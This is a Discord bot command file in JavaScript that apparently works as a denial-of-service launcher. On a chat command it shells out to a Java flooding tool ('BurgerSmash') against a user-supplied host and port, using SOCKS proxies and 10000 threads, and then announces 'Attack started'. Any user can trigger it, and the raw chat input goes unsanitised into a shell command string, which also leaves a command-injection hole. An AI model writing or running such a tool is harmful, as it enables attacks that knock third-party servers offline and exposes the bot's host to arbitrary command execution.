const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -jar BurgerSmash-0.1.jar host-${host} port-${port} socks_proxies.txt proxymode-socks threads-10000 loop-700 debug-true time-120`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('❖ Smasher')
	.setTimestamp()
	.setDescription("**❖ BadHandShake** \n \n ❖ Attack started to: \n ❖ for 999 seconds")
	.setFooter('© Developer Matija#3553.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['smasher'],
  permLevel: 0
}

exports.help = {
  name: 'smasher',
  description: 'Özel',
  usage: 'smasher'
}